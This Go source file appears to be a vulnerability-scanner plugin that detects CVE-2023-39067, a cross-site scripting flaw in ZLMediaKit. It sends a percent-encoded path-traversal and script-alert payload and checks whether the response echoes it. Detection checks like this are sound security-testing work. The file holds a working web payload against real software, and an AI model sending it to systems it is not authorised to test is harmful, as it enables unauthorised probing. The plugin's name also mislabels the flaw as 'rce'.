package goplugin

import (
	utils "Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("zlmediakit_rce_cve_2023_39067", &zlmediakit_rce_cve_2023_39067{})
}

type zlmediakit_rce_cve_2023_39067 struct{}

func (p *zlmediakit_rce_cve_2023_39067) Info() PluginInfo {
	return PluginInfo{
		Name:     "ZLMediaKiet 跨站脚本漏洞（CVE-2023-39067）",
		VulnInfo: "ZLMediaKiet是ZLMediaKiet开源的一个基于 C++11 的高性能运营级流媒体服务框架。ZLMediaKiet v.4.0和v.5.0版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。攻击者可利用该漏洞通过构建有效载荷对URL执行任意代码。",
		VulnID:   "CVE-2023-39067",
		Level:    "6.1 MEDIUM",
		URL:      "",
		Version:  "4.0 <= ZLMediaKit <= 5.0",
		CWE:      "CWE-79	跨站脚本",
	}
}

func (p *zlmediakit_rce_cve_2023_39067) Check(netloc string) bool {
	payload := "/%2f%2e%2e%2f%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%43%56%45%2d%32%30%32%33%2d%33%39%30%36%37%27%29%3b%3c%2f%73%63%72%69%70%74%3e"
	req, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "CVE-2023-39067") {
		return true
	}

	return false
}
